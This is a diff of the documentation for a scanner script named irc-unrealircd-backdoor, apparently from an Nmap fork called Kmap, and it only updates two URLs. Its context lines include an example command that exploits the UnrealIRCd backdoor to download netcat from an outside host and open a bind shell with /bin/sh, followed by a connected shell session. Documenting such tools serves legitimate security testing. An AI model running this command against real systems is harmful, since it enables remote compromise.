@@ -17,7 +17,7 @@ netcat listener as demonstrated here:
 <code>
   $ kmap -d -p6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='wget http://www.javaop.com/~ron/tmp/nc && chmod +x ./nc && ./nc -l -p 4444 -e /bin/sh' <target>
   $ ncat -vv localhost 4444
-  Ncat: Version 5.30BETA1 ( https://kmap.org/ncat )
+  Ncat: Version 5.30BETA1 ( https://github.com/YurilLAB/Kmap/ncat )
   Ncat: Connected to 127.0.0.1:4444.
   pwd
   /home/ron/downloads/Unreal3.2-bad
@@ -57,7 +57,7 @@ Reference:
 --
 
 author = {"Vlatko Kosturjak", "Ron Bowes"}
-license = "Same as Kmap--See https://kmap.org/book/man-legal.html"
+license = "Same as Kmap--See https://github.com/YurilLAB/Kmap/blob/master/LICENSE"
 categories = {"exploit", "intrusive", "malware", "vuln"}
 
 
